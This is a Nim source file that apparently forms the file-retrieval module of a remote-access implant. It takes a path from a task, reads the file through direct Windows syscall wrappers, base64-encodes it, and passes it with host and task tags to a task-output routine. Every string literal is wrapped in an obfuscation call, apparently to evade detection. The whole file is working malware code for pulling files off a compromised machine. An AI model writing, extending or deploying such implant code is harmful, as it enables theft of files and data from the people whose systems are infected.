import std/[base64, json, strutils]
import ../utils/global
import ../utils/general/strings
import ../utils/tasks/buffer
import ../utils/msg
import ../utils/winapi/handlers
import ../utils/winapi/syscall as ntapi
import ../utils/winapi/utils

const max_file_size = (tasks_buffer_max - 4096'u64) * 3 div 4

var fileMaxSize* = 25'u64 * 1024 * 1024

const fileMaxSizeError* = obf("File exceeds the 25 MB limit")

const
  genericRead = 0x80000000'u32
  fileShareRead = 1'u32
  openExisting = 3'u32
  fileAttributeNormal = 0x80'u32
  invalidFileSize = culong(0xFFFFFFFF)

proc ioErrorMessage(code: culong): string =
  # Maps a Windows error code to a short message
  case int32(code)
  of 2, 3:
    obf("File does not exist")
  of 5:
    obf("Access denied")
  of 32:
    obf("File is in use by another process")
  of 33:
    obf("File is locked")
  of 123:
    obf("Invalid file path")
  of 206:
    obf("Path too long")
  of 995:
    obf("Operation aborted")
  of 1117:
    obf("I/O device error")
  of 1314:
    obf("Insufficient privilege")
  else:
    obf("Cannot read file (code=") & $int32(code) & obf(")")

proc queryFileByteSize(path: string): tuple[ok: bool, size: uint64, error: string] =
  # Reads the byte size of a file
  var w: array[520, uint16]
  asciiWide(path, w)
  let h = createFileW(
    addr w[0], genericRead, fileShareRead, nil, openExisting, fileAttributeNormal, 0)
  if h == invalidHandle:
    return (false, 0, ioErrorMessage(getLastError()))

  var hi: culong = 0
  let lo = getFileSize(h, addr hi)
  if lo == invalidFileSize:
    let err = getLastError()
    discard ntapi.ntCloseHandle(h)
    if err != 0:
      return (false, 0, ioErrorMessage(err))
    return (false, 0, ioErrorMessage(0))

  let total = (uint64(hi) shl 32) or uint64(lo)
  discard ntapi.ntCloseHandle(h)
  (true, total, "")

proc readFileBytes(path: string): tuple[ok: bool, data: seq[byte], error: string] =
  # Reads a file into a byte sequence
  let meta = queryFileByteSize(path)
  if not meta.ok:
    return (false, @[], meta.error)

  let total = int(meta.size)
  if total <= 0:
    return (true, @[], "")

  if meta.size > fileMaxSize:
    return (false, @[], fileMaxSizeError)

  if meta.size > max_file_size:
    return (false, @[], obf("Output too large"))

  var w: array[520, uint16]
  asciiWide(path, w)
  let h = createFileW(
    addr w[0], genericRead, fileShareRead, nil, openExisting, fileAttributeNormal, 0)
  if h == invalidHandle:
    return (false, @[], ioErrorMessage(getLastError()))

  var bytes = newSeq[byte](total)
  var offset = 0
  while offset < total:
    let chunk = min(total - offset, 1024 * 1024)
    let n = ntapi.readFile(h, addr bytes[offset], culong(chunk))
    if n == 0:
      let err = getLastError()
      discard ntapi.ntCloseHandle(h)
      if offset == 0:
        return (false, @[], ioErrorMessage(err))
      bytes.setLen(offset)
      return (true, bytes, "")
    offset += int(n)

  discard ntapi.ntCloseHandle(h)
  (true, bytes, "")

proc baseName(path: string): string =
  # Returns the file name from a path
  let sep = path.rfind('\\')
  if sep >= 0: path[sep + 1 .. ^1] else: path

proc runGetContent*(host, taskTag, input, params: string) =
  # Main function that sends file content for a task
  let inputPath = input.strip()

  if inputPath.len == 0 or inputPath == obf("/") or inputPath == obf(" "):
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): obf("File path is empty"),
    }), params, taskTag)
    return

  let sizeMeta = queryFileByteSize(inputPath)
  if not sizeMeta.ok:
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): sizeMeta.error,
    }), params, taskTag)
    return
  if sizeMeta.size > fileMaxSize:
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): fileMaxSizeError,
    }), params, taskTag)
    return

  let readResult = readFileBytes(inputPath)
  if not readResult.ok:
    discard apply_task_output($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("get_content"): true,
      obf("error"): readResult.error,
    }), params, taskTag)
    return

  discard apply_task_output($( %*{
    obf("option"): obf("output"),
    obf("type"): obf("folders"),
    obf("host"): host,
    obf("task_tag"): taskTag,
    obf("get_content"): true,
    obf("file_name"): baseName(inputPath),
    obf("content"): encode(readResult.data),
  }), params, taskTag)

proc jobMessage*(host, taskTag, input, params: string): string =
  # Runs get content and returns an empty string
  runGetContent(host, taskTag, input, params)
  ""

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Writes the job message into the output buffer
  writeMsg(jobMessage(host, taskTag, input, params), buf)
